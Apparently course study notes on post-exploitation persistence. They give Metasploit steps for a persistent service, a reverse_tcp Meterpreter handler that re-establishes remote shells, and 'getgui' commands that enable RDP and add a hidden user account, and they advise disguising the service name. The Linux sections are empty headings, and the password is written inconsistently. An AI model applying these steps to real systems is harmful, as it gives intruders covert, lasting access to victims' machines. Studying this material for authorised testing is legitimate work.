
Persistence is techniques to keep access when access is cut off
Gaining initial foothold is not enough, you need to setup and maintain persistent access to your target. 


#### Windows Persistence

##### Persistence via Services 

- identify vulnerable system you can exploit on target system 

After getting initial foothold and a meterpreter session search for **persistence_service** 

in msfconsole: 
- ``use persistence service`` (you need admin credentials for this module)
- change ``lport`` 
- in real life scenario change the service name to make sure that it blends in. 
- ``kill`` the sessions (no more sessions on target)

how to regain access with persistence? 
- restart msfconsole 
- use ``multi/handler ``
- set payload windows/meterpreter/reverse_tcp 
- set ``lhost`` and ``lport`` 
- exploit 

every time you run the handler the session is created. 



##### Persistence via RDP 

badblue_ext_overflow 
- identify vulnerable system on target 
- migrate to stable process in meterpreter 

Gain persistence: 
1. ``run getgui -e -u hacker -p hacked_123321 ``
	- getgui will check if RDP is enabled if not it will enable it and, add a user and hide it from login screen 
	- this command also provides a resource script to clean up

utilize rdp client to connect to new account created: 
- ``xfreerdp /u:hacker /p:hacked123321 /v:target_ip ``

login on screen with new credentials and open cmd (run as administrator): ``whoami /priv ``
``net user ``




#### Linux Persistence

##### Persistence via SSH keys




















##### persistence via Cron Jobs 

